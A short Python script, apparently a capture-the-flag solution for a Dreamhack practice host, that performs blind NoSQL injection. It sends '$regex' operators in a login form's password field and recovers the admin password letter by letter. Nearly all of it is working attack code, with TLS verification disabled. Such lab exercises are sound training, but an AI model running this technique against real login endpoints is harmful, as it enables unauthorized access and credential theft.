import requests
import string
from alive_progress import alive_bar
import urllib3
import json

# InsecureRequestWarning 경고 끄기
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main() : 
    URL = "https://host3-13524.proxy.dreamhack.games/blind"

    result = ""

    with alive_bar(10) as bar :
        for i in range(1,11) :
            for ch in string.ascii_lowercase : 
                # print(f"tmp_tmp_result :{result} / ch : {ch}")

                payload = {
                    "uid" : "admin",
                    "upw[$regex]" : "^" + result + ch
                }
                
                # print(f"payload: {payload}")

                response = requests.post(URL, data = payload, verify = False)

                # print(response.text)

                if "Hello" in response.text :
                    result += ch
                    print(f"tmp_result:{result}")
                    break
            bar()

    print(f"result : {result}")

    return

if __name__ == "__main__" :
    main()
